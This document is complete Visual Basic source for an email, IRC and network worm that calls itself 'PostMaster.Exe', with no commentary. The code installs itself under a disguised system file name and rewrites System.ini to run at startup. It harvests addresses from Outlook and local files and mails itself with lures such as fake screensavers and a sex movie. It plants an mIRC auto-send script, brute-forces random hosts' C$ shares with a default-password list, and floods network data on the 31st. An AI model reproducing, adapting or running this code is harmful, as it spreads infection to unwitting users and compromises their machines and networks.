Dim Fso, Wnt, Wol, Wom, Wos, Windir, Winsys, Wincmd, Wintmp, NewFile, OldFile, OutLook, TextBody, Program, EUser, HUser, EPassword, EmailAddress, EmailSubject, EmailBody, EmailPrg 
Sub Main() 
 On Error Resume Next 
 Dim Server, TmpAddress As String, Start, Last, Start1, Last1 
 Call Init 
 Call Copy_To 
 Call Auto_Run 
 Call Mail_Worm 
 For Each Drive In Fso.Drives 
  Call Sub_Folder(Fso.GetFolder(Drive & "\")) 
 Next Drive 
 Let Start = 0 
 Let Last = 0 
 Do Until (Last >= Len(EmailAddress)) 
  Let Start = Last + 1 
  Let Last = InStr(Start, EmailAddress, "*") 
  If Send_Ok(Mid(EmailAddress, Start, Last - Start)) = True Then 
   Send_Mail (Mid(EmailAddress, Start, Last - Start)) 
  End If 
 Loop 
 Wos.SignOff 
 Set Wos = Nothing 
 Set Wom = Nothing 
 Set Wol = Nothing 
 Call Net_Work 
End Sub 
Sub Init() 
 On Error Resume Next 
 Dim Tmp 
 Randomize Minute(Time) + Hour(Time) + Second(Time) + Day(Date) 
 Set Fso = CreateObject("scripting.filesystemobject") 
 Set Wnt = CreateObject("wscript.network") 
 Set Wol = CreateObject("outlook.application") 
 Let OutLook = True 
 If Err.Number = 429 Then OutLook = False 
 Let Windir = Fso.GetSpecialFolder(WindowsFolder) 
 Let Winsys = Fso.GetSpecialFolder(SystemFolder) 
 Let Wintmp = Fso.GetSpecialFolder(TemporaryFolder) 
 Let Wincmd = Windir & "\Command\Ebd" 
 Let Program = GetExeName 
 Let EUser = "administrator*admin*master*webmaster*webroot*root*system*" 
 Let EPassword = "internet*administrator*admin*master*network*webserver*server*root*webmaster*webroot*system*windows*computer*passwd*password*webroot*shell*login*webpage*nopasswd*nopassword*1234*4321*" 
End Sub 
Function Send_Ok(Address) 
 On Error Resume Next 
 Send_Ok = True 
 If Not Fso.FileExists(Winsys & "\Erifeci.Vxd") Then 
  Set NewFile = Fso.CreateTextFile(Winsys & "\Erifeci.Vxd") 
  NewFile.WriteLine "[PostMaster.Exe V1.0 MadeIn:CHINA]" 
  NewFile.WriteLine Address 
  NewFile.Close 
  Fso.GetFile(Winsys & "\Erifeci.Vxd").Attributes = 7 
 Else: 
  Let TextBody = "" 
  Set OldFile = Fso.OpenTextFile(Winsys & "\Erifeci.Vxd") 
  Do Until (OldFile.AtEndOfStream) 
   Let TextBody = TextBody & OldFile.ReadLine & vbCrLf 
  Loop 
  OldFile.Close 
  If InStr(TextBody, Address) Then 
   Let Send_Ok = False 
  Else: 
   Fso.GetFile(Winsys & "\Erifeci.Vxd").Attributes = 0 
   Set OldFile = Fso.OpenTextFile(Winsys & "\Erifeci.Vxd", 2) 
   OldFile.Write TextBody 
   OldFile.WriteLine Address 
   OldFile.Close 
   Fso.GetFile(Winsys & "\Erifeci.Vxd").Attributes = 7 
  End If 
 End If 
End Function 
Sub Send_Mail(Address) 
 On Error Resume Next 
 Dim Mail, Tmp, User, Server, Start, Last 
 Let Start = 1 
 Let Last = InStr(Address, "@") 
 Let User = Mid(Address, 1, Last - Start) 
 Let Server = Right(Address, Len(Address) - (Len(User) + 1)) 
 Let Tmp = Int((Rnd * 4) + 1) 
 Select Case Tmp 
  Case 1: 
   Let EmailSubject = User & ",How Are You?" 
   Let EmailBody = EmailSubject & vbCrLf & Space(2) & "If You Like Cool Screen Save,Please Check This Attachment File." & vbCrLf & _ 
           "If You Have Other Cool Screen Save,Please Send To Me!My New E-Mail Address Is:" & "New" & User & "@" & Server & ".Thanks!" 
   Let EmailPrg = Wintmp & "\My-Cool-Screen-Save.Scr" 
  Case 2: 
   Let EmailSubject = "This Mail For My " & User & "!" 
   Let EmailBody = " I Very Like Play Computer Game,Attachment Is Very Well Computer Game.If You Like Play Too Me,Please Check This Attachment File." & vbCrLf & _ 
           "If You Have Other Game,Please Send To Me!My New E-Mail Address Is:" & "New" & User & "@" & Server & ".Thanks!" 
   Let EmailPrg = Wintmp & "\Well-Computer-Game.Exe" 
  Case 3: 
   Let EmailSubject = User & ",Help Me!" 
   Let EmailBody = " Please Open Attachment File,You Can See A Photo,But I Don't Know Is Who?Please Help Me!" & vbCrLf & _ 
           "Please Send Your Reply To Me! My New E-Mail Address Is:New" & User & "@" & Server & ".Thanks!" 
   Let EmailPrg = Wintmp & "\Photo.Jpg.Scr" 
  Case 4: 
   Let EmailSubject = "Sex Movie For My " & User & "!" 
   Let EmailBody = " Attachment Is Sex Movie.If You Like,Please Check Attachment File.If You Have Other Sex Movie,Please " & vbCrLf & _ 
          "Don't Forget Me,I Need!Please Send Your Movie To My New E-Mail Address:" & "New" & User & "@" & Server & ".Thanks!" 
   Let EmailPrg = Wintmp & "\Sex-Movie.Exe" 
 End Select 
 Fso.CopyFile Winsys & "\Himem.Exe", EmailPrg 
 If OutLook = True Then 
  Set Mail = Wol.CreateItem(0) 
  Mail.Recipients.Add (Address) 
  Mail.Subject = EmailSubject 
  Mail.Body = EmailBody 
  Mail.Attachments.Add (EmailPrg) 
  Mail.Send 
 Else: 
  Wom.Compose 
  Wom.MsgIndex = -1 
  Wom.RecipAddress = Address 
  Wom.MsgSubject = EmailSubject 
  Wom.MsgNoteText = EmailBody 
  Wom.AttachmentPathName = EmailPrg 
  Wom.Send 
 End If 
 Set Mail = Nothing 
 Fso.GetFile(EmailPrg).Attributes = 0 
 Fso.DeleteFile EmailPrg 
End Sub 
Sub Mail_Worm() 
 On Error Resume Next 
 Dim Times, Mapi, A, Ctrentries 
 If OutLook = False Then 
  Set Wom = CreateObject("MSMAPI.MapiMessages") 
  Set Wos = CreateObject("MSMAPI.MapiSession") 
  Wos.DownLoadMail = False 
  Wos.NewSession = False 
  Wos.LogonUI = True 
  Wos.SignOn 
  Wom.SessionID = Wos.SessionID 
  Wom.FetchSorted = True 
  Wom.Fetch 
  For Times = 0 To Wom.MsgCount - 1 
   Wom.MsgIndex = Times 
   If Send_Ok(Wom.MsgOrigAddress) = True Then Send_Mail (Wom.MsgOrigAddress) 
  Next 
 Else: 
  Set Mapi = Wol.GetNameSpace("MAPI") 
  For ctrlists = 1 To Mapi.AddressLists.Count 
   Set A = Mapi.AddressLists(ctrlists) 
   For Ctrentries = 1 To A.AddressEntries.Count 
    If Send_Ok(A.AddressEntries(Ctrentries)) = True Then Send_Mail (A.AddressEntries(Ctrentries)) 
   Next 
  Next 
  Set Mapi = Nothing 
  Set A = Nothing 
 End If 
End Sub 
Function GetExeName() 
 On Error Resume Next 
 Dim GetReally As Boolean 
 Let GetReally = False 
 Do Until (GetReally = True) 
  If Len(App.Path) = 3 Then 
   Let FileName = App.Path & LCase(Dir(App.Path & App.EXEName & ".*")) 
  Else: 
   Let FileName = App.Path & "\" & LCase(Dir(App.Path & "\" & App.EXEName & ".*")) 
  End If 
  If InStr(FileName, "exe") Or InStr(FileName, "scr") Or InStr(FileName, "pif") Or InStr(FileName, "com") Then 
   Let TextBody = "" 
   Set OldFile = Fso.OpenTextFile(FileName) 
   Do Until (OldFile.AtEndOfStream) 
    Let TextBody = TextBody & OldFile.ReadLine 
   Loop 
   OldFile.Close 
   If Fso.GetFile(FileName).Size = 18944 Then GetReally = True: GetExeName = FileName 
  End If 
 Loop 
End Function 
Sub Copy_To() 
 On Error Resume Next 
 If Not Fso.FileExists(Winsys & "\Himem.Exe") Then 
  Shell Windir & "\Explorer.Exe", vbMaximizedFocus 
  Fso.CopyFile Program, Winsys & "\Himem.Exe" 
  Fso.GetFile(Winsys & "\Himem.Exe").Attributes = 7 
 End If 
 For Each Drive In Fso.Drives 
  If Not Fso.FileExists(Drive & "\Sex_Movie.Scr") Then 
   Fso.CopyFile Program, Drive & "\Sex_Movie.Scr" 
   Fso.GetFile(Drive & "\Sex_Movie.Scr").Attributes = 5 
  End If 
 Next 
 If Not Fso.FileExists(Wincmd & "\Sex_Movie.Scr") Then 
  Fso.CopyFile Program, Wincmd & "\Sex_Movie.Scr" 
  Fso.GetFile(Wincmd & "\Sex_Movie.Scr").Attributes = 5 
 End If 
End Sub 
Sub Auto_Run() 
 On Error Resume Next 
 Dim Tmp As Integer 
 TextBody = "" 
 Set OldFile = Fso.OpenTextFile(Windir & "\System.ini") 
 Do Until (OldFile.AtEndOfStream) 
  TextBody = TextBody & OldFile.ReadLine & vbCrLf 
 Loop 
 OldFile.Close 
 If InStr(LCase(TextBody), "shell=explorer.exe " & LCase(Winsys) & "\himem.exe") = 0 Then 
  Let Tmp = Fso.GetFile(Windir & "\System.ini").Attributes 
  Fso.GetFile(Windir & "\System.ini").Attributes = 0 
  Set NewFile = Fso.OpenTextFile(Windir & "\System.ini", 2) 
  NewFile.Write Replace(LCase(TextBody), "shell=explorer.exe", "shell=Explorer.exe " & Winsys & "\Himem.exe") 
  NewFile.Close 
  Fso.GetFile(Windir & "\System.ini").Attributes = Tmp 
 End If 
End Sub 
Sub Sub_Folder(SubFolder) 
 On Error Resume Next 
 For Each File In SubFolder.Files 
  Call Sub_File(File) 
 Next File 
 For Each Folder In SubFolder.SubFolders 
  Call Sub_Folder(Folder) 
 Next Folder 
End Sub 
Sub Sub_File(File) 
 On Error Resume Next 
 Dim ExtName, Mirc, Address, Start, Last, Times, NoLetter 
 Let ExtName = LCase(Fso.GetExtensionName(File.Path)) 
 If LCase(File.Name) = "mirc.ini" And InStr(LCase(File.Path), "\mirc") Then 
  Let Mirc = Fso.GetParentFolderName(File.Path) 
  Fso.GetFile(Mirc & "\Script.ini").Attributes = 0 
  Set NewFile = Fso.CreateTextFile(Mirc & "\Script.ini", True) 
  NewFile.WriteLine ";PostMaster.Exe V1.0 MadeIn:CHINA" 
  NewFile.WriteLine ";Good Wish For You!!!" 
  NewFile.WriteLine "n0=on 1:JOIN:#:{" 
  NewFile.WriteLine "n1= /if ( $nick == $me ) { halt }" 
  NewFile.WriteLine "n2= /.dcc send $nick " & Wincmd & "\Sex_Movie.Scr" 
  NewFile.WriteLine "n3=}" 
  NewFile.Close 
  Fso.GetFile(Mirc & "\Script.ini").Attributes = 7 
 ElseIf ExtName = "htm" Or ExtName = "html" Or ExtName = "hta" Or _ 
     ExtName = "shtml" Or ExtName = "shtm" Then 
  TextBody = "" 
  Set OldFile = Fso.OpenTextFile(File.Path) 
  Do Until (OldFile.AtEndOfStream) 
   Let TextBody = TextBody & OldFile.ReadLine & vbCrLf 
  Loop 
  OldFile.Close 
  Let Start = 1 
  Do Until (Start = 0) 
   Let NoLetter = True 
   Let Start = InStr(Start, LCase(TextBody), "mailto:") 
   If Start <> 0 Then Start = Start + 7: NoLetter = False 
   Let Times = Start 
   Do Until (NoLetter = True) 
    If InStr("abcdefghijklmnopqrstuvwxyz0123456789@._", Mid(TextBody, Times, 1)) = 0 And Times >= Start + 8 Then 
     Let NoLetter = True 
    Else: 
     Let Times = Times + 1 
    End If 
   Loop 
   Let Last = Times 
   If Start <> 0 Then 
   Let Address = LCase(Mid(TextBody, Start, Last - Start)) 
   If InStr(Address, ".com") Or InStr(Address, ".net") Or InStr(Address, ".edu") Or InStr(Address, ".org") Or InStr(Address, ".mil") Or InStr(Address, ".gov") Then 
   If Right(Address, 1) <> "." Then 
    Let EmailAddress = EmailAddress & LTrim(Mid(TextBody, Start, Last - Start)) & "*" 
   Else: 
    Let EmailAddress = EmailAddress & LTrim(Mid(TextBody, Start, Last - Start - 1)) & "*" 
   End If 
   End If 
   Let Start = Start + 1 
   End If 
  Loop 
 ElseIf InStr("docwpscomexelnkpifbmpswfscrwavmpgmp3mp4", EXEName) = 0 Then 
  Let TextBody = "" 
  Set OldFile = Fso.OpenTextFile(File.Path) 
  Do Until (OldFile.AtEndOfStream) 
   Let TextBody = TextBody & OldFile.ReadLine & vbCrLf 
  Loop 
  OldFile.Close 
  Let Start = 1 
  Do Until (Start = 0) 
   Let NoLetter = True 
   Let Start = InStr(Start, LCase(TextBody), "mail:") 
   If Start <> 0 Then Let NoLetter = False: Let Start = Start + 5 
   Let Times = Start 
   Do Until (NoLetter = True) 
    If InStr("abcdefghijklmnopqrstuvwxyz0123456789@._", Mid(TextBody, Times, 1)) = 0 And Times >= Start + 8 Then 
     Let NoLetter = True 
    Else: 
     Let Times = Times + 1 
    End If 
   Loop 
   Let Last = Times 
   If Start <> 0 Then 
   Let Address = LCase(Mid(TextBody, Start, Last - Start)) 
   If InStr(Address, ".com") Or InStr(Address, ".net") Or InStr(Address, ".edu") Or InStr(Address, ".org") Or InStr(Address, ".mil") Or InStr(Address, ".gov") Then 
   If Right(Address, 1) <> "." Then 
    Let EmailAddress = EmailAddress & LTrim(Mid(TextBody, Start, Last - Start)) & "*" 
   Else: 
    Let EmailAddress = EmailAddress & LTrim(Mid(TextBody, Start, Last - Start - 1)) & "*" 
   End If 
   End If 
   Let Start = Start + 1 
   End If 
  Loop 
 End If 
End Sub 
Sub Net_Work() 
 On Error Resume Next 
 Dim IP1, IP2, IP3, IP4, ShareName 
 If Day(Date) = 31 Then 
  Do 
   DoEvents 
   Form1.Winsock1.SendData "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" & _ 
               "911911911911911911911911911911911911911911911911" 
  Loop 
 Else: 
  Do 
Start: 
   DoEvents 
   Let IP1 = LTrim(Str(Int((Rnd * 254) + 1))) 
   Let IP2 = LTrim(Str(Int((Rnd * 254) + 1))) 
   Let IP3 = LTrim(Str(Int((Rnd * 254) + 1))) 
   Let IP4 = LTrim(Str(Int((Rnd * 254) + 1))) 
   ShareName = "\\" & IP1 & "." & IP2 & "." & IP3 & "." & IP4 & "\C" 
   Wnt.MapNetworkDrive "o:", ShareName 
   If Not Fso.FolderExists("o:\") Then 
    Call Open_Pass(ShareName) 
   End If 
   If Not Fso.FolderExists("o:\") Then GoTo Start 
   Fso.CopyFile Winsys & "\Himem.Exe", "o:\windows\startm~1\programs\startup\ScanReg.Pif", True 
   Fso.CopyFile Winsys & "\Himem.Exe", "o:\Sex_Movie.Scr", True 
   Fso.CopyFile Winsys & "\Himem.Exe", "o:\winnt\startm~1\programs\startup\ScanReg.Pif", True 
   Fso.CopyFile Winsys & "\Himem.Exe", "o:\" & Right(Windir, Len(Windir) - 3) & "\startm~1\programs\startup\ScanReg.Pif", True 
   Wnt.RemoveNetworkDrive "o:" 
  Loop 
 End If 
End Sub 
Sub Open_Pass(ShareName) 
 Dim Start, Last, Tmp, Tmp1, Start1, Last1 
 Let Start = 0 
 Let Last = 0 
 Do Until (Last = Len(EUser)) 
  Let Start = Last + 1 
  Let Last = InStr(Start, EUser, "*") 
  Let Tmp = Mid(EUser, Start, Last - Start) 
  Let Start1 = 0 
  Let Last1 = 0 
  Do Until (Last1 = Len(EPassword)) 
   Let Start1 = Last1 + 1 
   Let Last1 = InStr(Start1, EPassword, "*") 
   Let Tmp1 = Mid(EPassword, Start1, Last1 - Start1) 
   Wnt.MapNetworkDrive "o:", ShareName, Tmp, Tmp1 
   If Fso.FolderExists("o:\") Then Exit Sub 
  Loop 
 Loop 
End Sub 
